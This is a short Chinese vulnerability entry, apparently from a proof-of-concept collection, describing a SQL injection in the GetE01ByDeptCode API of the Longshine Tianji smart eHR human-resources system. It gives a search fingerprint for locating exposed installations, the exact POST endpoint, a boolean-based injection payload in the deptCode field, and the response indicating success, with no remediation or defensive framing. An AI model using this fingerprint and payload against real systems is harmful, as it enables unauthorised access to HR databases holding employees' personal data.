# 朗新天霁智能eHR人力资源管理系统GetE01ByDeptCode存在SQL注入漏洞

朗新天霁智能eHR人力资源管理系统 ｜ SQL注入 ｜ —
- **指纹**：`body="divRememberPwd"`
- **请求**：`POST /api/Com/GetE01ByDeptCode HTTP/1.1`

**Payload**
```
{"deptCode":"1') AND 8104=8104 AND ('UCOF'='UCOF"}
```
- **响应特征**：200